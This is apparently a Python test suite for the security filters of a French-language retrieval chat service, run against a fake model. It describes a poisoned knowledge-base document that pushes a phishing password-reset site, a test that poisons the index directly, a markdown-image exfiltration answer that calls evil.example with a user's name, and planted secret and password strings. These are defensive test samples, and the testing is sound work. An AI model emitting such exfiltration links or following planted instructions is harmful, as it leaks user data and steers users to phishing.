"""End-to-end tests of /chat: [1] -> [2][3] -> LLM -> [4], with a fake LLM."""

import hashlib
from pathlib import Path

import pytest

from app.rag.chain import BLOCKED_OUTPUT_MESSAGE, NO_CONTEXT_MESSAGE, UNAVAILABLE_MESSAGE
from app.rag.ingest import ingest_corpus, split_markdown
from app.scoring.rules import ScoringRules

POISONED = Path(__file__).resolve().parent.parent / "eval" / "chunks" / "attack" / "reset_mdp_v2_html_comment.md"
PHISHING = "acme-support-reset.example"
QUESTION = "Comment réinitialiser mon mot de passe sur le portail libre-service ?"


@pytest.fixture
def kb(store, corpus, tmp_path):
    ingest_corpus(store, corpus, tmp_path / "q")
    return store


def poison_directly(store):
    """attack.py --direct: index the poisoned document without scan [0]."""
    raw = POISONED.read_bytes()
    store.upsert_document("procedure_reset_mdp_v2.md", hashlib.sha256(raw).hexdigest(), split_markdown(raw.decode("utf-8")))


def ask(client, message=QUESTION):
    response = client.post("/chat", json={"message": message})
    return response.status_code, response.json()


def test_clean_answer_is_grounded_on_retrieved_chunks(client, kb, provider, events):
    provider.answer = "Rendez-vous sur https://moncompte.acme.fr [reinitialisation_mot_de_passe.md]."
    status, body = ask(client)
    assert status == 200 and body["status"] == "safe"
    assert body["response"] == provider.answer and body["output_decision"] == "ALLOW"
    assert "reinitialisation_mot_de_passe.md" in body["sources"] and body["dropped_chunks"] == 0

    [system, user] = provider.calls[0]
    assert system["role"] == "system" and "donnée" in system["content"]
    assert "<extraits>" in user["content"] and "https://moncompte.acme.fr" in user["content"]
    assert user["content"].endswith(f"Question : {QUESTION}")
    assert [e["event_type"] for e in events()[-1:]] == ["prompt.scanned"]  # nothing flagged


def test_poisoned_chunk_never_reaches_the_llm(client, kb, provider, events):
    poison_directly(kb)
    events_before = len(events())
    status, body = ask(client)

    assert status == 200 and body["dropped_chunks"] >= 1
    assert PHISHING not in provider.prompt_text()
    assert "procedure_reset_mdp_v2.md" not in body["sources"]

    new = events()[events_before:]
    assert [e["event_type"] for e in new][0] == "prompt.scanned"
    flagged = [e for e in new if e["event_type"] == "retrieval.chunk_flagged"]
    assert flagged and all(e["doc_id"] == "procedure_reset_mdp_v2.md" for e in flagged)
    assert {e["request_id"] for e in new} == {body["request_id"]}  # one id for the whole request


def test_only_poisoned_chunks_means_no_llm_call(client, store, provider):
    poison_directly(store)
    status, body = ask(client)
    assert status == 200 and body["status"] == "no_context"
    assert body["response"] == NO_CONTEXT_MESSAGE and provider.calls == []


def test_phishing_url_in_answer_is_redacted(client, kb, provider, events):
    # As if an injection had reached the model anyway: [4] is the last line of defence.
    provider.answer = f"Le portail officiel est désormais https://{PHISHING}/login, merci."
    status, body = ask(client)
    assert body["status"] == "filtered" and PHISHING not in body["response"]
    assert ScoringRules.URL_REDACTION in body["response"]
    [event] = events("output.flagged")
    assert event["action"] == "redact_urls" and event["redacted_hosts"] == [PHISHING]
    assert event["context"] == "llm_output" and event["request_id"] == body["request_id"]


def test_markdown_image_exfiltration_is_blocked(client, kb, provider, events):
    provider.answer = "Voici ![x](https://evil.example/p.png?q=prenom.nom) la procédure."
    _, body = ask(client)
    assert body["status"] == "blocked" and body["response"] == BLOCKED_OUTPUT_MESSAGE
    assert body["output_decision"] == "BLOCK"
    [event] = events("output.flagged")
    assert event["action"] == "block" and event["owasp"] == "LLM02"


def test_secret_in_answer_is_blocked_and_not_logged(client, kb, provider, events):
    secret = "AK" + "IA" + "FAKE" * 4  # built at runtime, not a real key
    provider.answer = f"La clé d'accès est {secret}."
    _, body = ask(client)
    assert body["status"] == "blocked" and secret not in body["response"]
    [event] = events("output.flagged")
    assert secret not in str(event)
    assert "sensitive_info_disclosure" in event["labels"] and event["owasp"] == "LLM02"


def test_credential_disclosure_is_blocked(client, kb, provider):
    provider.answer = "Le mot de passe temporaire est Acme2026!"
    _, body = ask(client)
    assert body["status"] == "blocked" and body["output_decision"] == "WARN"


def test_warn_prompt_is_answered_and_logged(client, kb, provider, events):
    # WARN on a user prompt is allow_and_log (rules.WARN_POLICY).
    status, body = ask(client, 'What does "no restrictions" mean in the new BYOD policy?')
    assert status == 200 and body["decision"] == "WARN" and provider.calls
    assert events("prompt.scanned")[-1]["decision"] == "WARN"


def test_ollama_down_returns_503(client, kb, provider):
    provider.fail = True
    status, body = ask(client)
    assert status == 503 and body["status"] == "unavailable" and body["response"] == UNAVAILABLE_MESSAGE
